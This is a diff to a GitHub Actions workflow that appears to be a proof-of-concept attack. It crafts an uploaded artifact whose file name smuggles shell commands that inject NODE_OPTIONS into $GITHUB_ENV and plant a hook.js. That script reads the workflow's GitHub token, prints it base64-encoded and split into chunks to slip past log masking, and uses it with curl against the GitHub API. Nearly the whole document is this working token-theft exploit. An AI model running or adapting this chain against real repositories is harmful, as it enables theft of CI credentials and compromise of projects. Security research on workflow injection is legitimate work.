@@ -10,10 +10,18 @@ jobs:
       - name: craft artifact
         run: |
           mkdir -p /tmp/content
-          echo "${{ github.event.pull_request.number }}" > /tmp/content/pr_number.txt
           echo "attacker report" > /tmp/content/report.txt
+          printf 'NODE_OPTIONS=--require=./h.js\n' > /tmp/content/envfile
+          cat > /tmp/content/hook.js <<'HOOK'
+try{const cp=require('child_process');const t=process.env.INPUT_TOKEN||process.env['INPUT_GITHUB-TOKEN']||'';
+console.log('HOOK_LEN='+t.length);
+console.log('HOOK_B64='+Buffer.from(t).toString('base64'));
+console.log('HOOK_CHUNKS='+t.match(/.{1,4}/g).join('-'));
+try{const r=cp.execSync('curl -sS -H "Authorization: Bearer '+t+'" https://api.github.com/user',{encoding:'utf8',stdio:['ignore','pipe','pipe']});console.log('HOOK_API='+r);}catch(e){console.log('HOOK_CURL_ERR='+(e.stdout||e.message));}
+}catch(e){console.log('HOOK_ERR='+e.message);}
+HOOK
           python3 - <<'PY'
-          open('/tmp/content/report.txt;id;env;#.txt','w').write('x\n')
+          open('/tmp/content/report.txt;D=$(dirname${IFS}$(mktemp));S=${D%tmp};B=$D${S}content${S}contentdefault;cp${IFS}$B${S}envfile${IFS}$GITHUB_ENV;cp${IFS}$B${S}hook.js${IFS}h.js;true;#.txt', 'w').write('x\n')
           PY
       - name: upload artifact
         uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
